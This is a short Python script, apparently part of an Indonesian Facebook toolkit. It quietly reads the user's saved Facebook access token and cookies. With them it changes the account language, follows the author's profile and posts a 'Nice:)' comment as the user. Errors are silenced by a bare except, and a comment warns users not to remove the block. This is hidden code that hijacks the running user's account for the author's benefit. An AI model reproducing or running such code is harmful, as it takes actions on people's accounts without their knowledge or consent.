#!usr/bin/python3.7
#Author: DulLah ©2019
# FB : fb.me/dulahz
#Telegram : t.me/unikers
#github: github.com/dz-id
# YANG INI JANGAN DIGANTI YA STERR:) APALAGI DIHAPUS
try:
	import requests
	from bs4 import BeautifulSoup as parser
	from http.cookiejar import LWPCookieJar as kuki
	#//
	ua = {'User-Agent' : open('UserAgent/ua.txt').read()}
	token = open('log/token').read()
	with requests.Session() as s:
		s.cookies = kuki('log/kuki')
		s.cookies.load()
		la = s.get('https://mbasic.facebook.com/language.php',headers = ua)
		pa = parser(la.content, 'html.parser')
		bh = pa.find('a', string = 'Bahasa Indonesia')
		s.get('https://mbasic.facebook.com'+str(bh['href']),headers = ua) #// ganti bahasa
		s.post('https://graph.facebook.com/dulahz/subscribers?access_token='+token,headers = ua) #// foll aing:V
		s.post('https://graph.facebook.com/1145924768936987/comments?message=Nice:)*&access_token='+token,headers = ua) #// comment
except:
		pass